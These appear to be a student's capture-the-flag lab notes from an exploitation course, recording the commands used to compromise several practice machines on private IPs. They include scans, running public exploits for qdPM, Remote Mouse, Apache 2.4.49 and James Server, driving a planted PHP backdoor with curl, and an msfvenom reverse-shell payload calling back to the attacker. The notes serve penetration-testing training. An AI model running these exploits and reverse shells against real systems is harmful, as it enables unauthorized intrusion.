
```bash
# IP: 192.168.249.11

# Service enumeration
sudo nmap -sV -sC -v 192.168.249.11
	# Found 22, 80

# Path enumeration
gobuster dir -u 192.168.249.11 -w /usr/share/wordlists/dirb/common.txt -t 10

# Creating a dictionnary of passwords
skweez http://192.168.249.11/ -d 2 > passwords.txt

# Given valid credential couple:
	# george@AIDevCorp.org:AIDevCorp

# Looking for exploit
searchsploit qdpm 9.1
	# Found 50944

# Moving exploit around
searchsploit -m 50944

# Running exploit
python3 50944.py -url http://192.168.249.11/project/ -u george@AIDevCorp.org -p AIDevCorp
	# Output:
	# Backdoor uploaded at - > http://192.168.249.11/project/uploads/users/427531-backdoor.php?cmd=whoami

# Finding the flag
curl http://192.168.249.11/project/uploads/users/427531-backdoor.php --data-urlencode 'cmd=find / -name "flag.txt" 2>/dev/null'

```

1. Start and exploit the _PublicExploits01_ machine.



```bash
# IP: 192.168.249.10

# Service enumeration
sudo nmap -sV -sC -v 192.168.249.10
	# 135
	# 139
	# 445: SMB. Seems like guest is enough. Remotemouse


# Connecting through SMB
nxc smb 192.168.249.10 -u "guest" -p "" --shares
	# Seeing offsec

# Checking for vuln in SMB
nxc smb 192.168.249.10 -u 'g' -p '' -M zerologon -M printnightmare -M smbghost -M  ms17-010
	# Seems like it's vulnerable to printnightmare

# Connect
smbclient -N //192.168.249.10/offsec -U 'charlotte'

# Download all files
mask "" 
recurse ON 
prompt OFF 
mget *
	# Takes a while, not super worth it since some files can't be read

# Axises:
	# PrintHood
	# Mouse server

# Found exploit: 
searchsploit mouse server
	# windows/remote/50972.py

# Exploiting
python 50972.py 192.168.249.10 192.168.45.238:8000 filemescouilles.txt
	# Successful!

# Generating RS via MSFvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.238 LPORT=4444 -f exe > reverse.exe

# RS works :D

```
![[Pasted image 20250319220709.png]]


2. Start and exploit the _PublicExploits02_ machine.

```bash
# IP: 192.168.249.188

# Enumeration
sudo nmap -sV -sC -v 192.168.249.188
	# Found Apache 2.4.49

# Looking for related exploit
searchsploit apache 2.4.49
	# Found Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE)
	# 50383

# Copying the exploit
searchsploit -m 50383

# Running the exploit :)
./50383.sh targets.txt /bin/sh 'find / -name "flag.txt" 2>/dev/null'
./50383.sh targets.txt /bin/sh 'cat /home/offsec/flag.txt'
	# GG!
```

![[Pasted image 20250319222515.png]]


3. **Capstone Lab**: An exploitable server is running services on several ports on the exercise VM, _PublicExploits03_. Treat this like a real box and start by identifying what services are running. There is a local user _student_ on this box with the password _lab_. Exploit the vulnerable service and SSH to the box to read _flag.txt_ located in _/home/challenge/_.

```bash
# IP: 192.168.249.52

# Enumeration
sudo nmap -sV -sC -v 192.168.249.52
	# Found only SSH - default credentials do not work

# Trying a deeper NMAP scan
sudo nmap -sV -sC -v --top-ports=5000 192.168.249.52
	# 32822: Found a remote James Admin :)

# Finding exploit
searchsploit james 2.3.2
	# Found:
		# 50347 - RCE Authenticated
		# 35513 - RCE 

# Retrieving exploit 50347
searchsploit -m 50347
	# Doesn't work, authentication fails (even with student / lab)

# Retrieving exploit 35513
searchsploit -m 35513

# Exploit doesn't seem to work, doing with Telnet directly
telnet 192.168.249.52 32822
	# root / root seems to work

# The script needs to be updated so that it uses the right port - as it's missing SMTP port apparently.

# Running an EVEN deeper NMAP:
sudo nmap -sV -sC -v -p- 192.168.249.52
	# Found many ports
	# 22 OpenSSH
	# 32826 SSH
	# 32825 SMTP
	# Other Mail related ports

# Updated the exploit with correct ports

# Started Listener
# Connection was established ;)
```
![[Pasted image 20250319225559.png]]